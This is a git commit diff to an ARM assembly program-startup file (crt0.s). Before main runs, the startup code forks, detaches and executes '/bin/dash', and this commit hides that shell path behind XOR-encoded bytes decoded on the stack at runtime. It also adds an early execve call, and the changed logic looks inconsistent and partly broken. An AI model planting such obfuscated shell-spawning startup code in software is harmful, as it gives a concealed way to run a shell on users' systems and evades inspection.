58b568adde4e277a79b24adc8571340d1ef2f3a1
gaidardzhiev <1v4n@protonmail.com>
2025-05-15 16:36:18 +0000

    Thu May 15 04:36:18 PM UTC 2025

--- crt0.s
+++ crt0.s
@@ -1,49 +1,75 @@
 .section .rodata
 .align 4
-z:
-.asciz "/bin/dash"
-x:
-.word z
-.word 0
+.equ XOR_KEY, 0xAA
+z_enc:
+//.byte 0x85,0xC8,0xC3,0xC4,0x85,0xCE,0xCB,0x99,0xD2,0x00
+.byte 0x85,0xC8,0xC3,0xC4,0x85,0xCE,0xCB,0xD9,0xC2,0x00
 .section .text
 .global _start
 .extern main
 _start:
 and sp, sp, #0xFFFFFFF8
-ldr r4,[sp]
-add r5,sp,#4
-ldr r5,[r5]
-add r6,sp,#8
-ldr r6,[r6]
-mov r7,#2
+sub sp, sp, #32
+mov r0, sp
+ldr r1, =z_enc
+mov r2, #10
+copy_loop:
+ldrb r3, [r1], #1
+strb r3, [r0], #1
+subs r2, r2, #1
+bne copy_loop
+mov r0, sp
+mov r2, #10
+decode_loop:
+ldrb r3, [r0]
+cmp r3, #0
+beq decode_done
+eor r3, r3, #XOR_KEY
+strb r3, [r0]
+add r0, r0, #1
+subs r2, r2, #1
+bne decode_loop
+decode_done:
+mov r1, sp
+add r2, sp, #12
+str r1, [r2]
+mov r3, #0
+str r3, [r2, #4]
+ldr r4, [sp, #32]
+ldr r5, [sp, #36]
+ldr r6, [sp, #40]
+mov r0, sp
+mov r1, r2
+mov r2, #0
+mov r7, #11
 svc #0
-cmp r0,#0
+cmp r0, #0
 bgt p
 i:
-mov r0,#0
-mov r7,#112
+mov r0, #0
+mov r7, #112
 svc #0
-mov r7,#2
+mov r7, #2
 svc #0
-cmp r0,#0
+cmp r0, #0
 bgt t
 m:
-ldr r0,=z
-ldr r1,=x
-mov r2,#0
-mov r7,#11
+mov r0, sp
+mov r1, r2
+mov r2, #0
+mov r7, #11
 svc #0
-mov r0,#1
-mov r7,#1
+mov r0, #1
+mov r7, #1
 svc #0
 t:
-mov r0,#0
-mov r7,#1
+mov r0, #0
+mov r7, #1
 svc #0
 p:
-mov r0,r4
-mov r1,r5
-mov r2,r6
+mov r0, r4
+mov r1, r5
+mov r2, r6
 bl main
-mov r7,#1
+mov r7, #1
 svc #0
